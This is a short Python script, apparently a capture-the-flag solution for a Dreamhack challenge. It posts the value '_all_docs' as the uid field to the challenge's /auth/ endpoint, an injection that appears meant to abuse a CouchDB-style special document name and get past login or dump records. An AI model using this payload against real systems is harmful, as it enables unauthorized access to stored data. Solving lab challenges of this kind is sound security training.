import requests

port = 8848
url_index = f"http://host3.dreamhack.games:{port}/"
url_auth = url_index + "auth/"
param = {"uid": "_all_docs"}

response = requests.post(url_auth, data=param)
print(response.text)
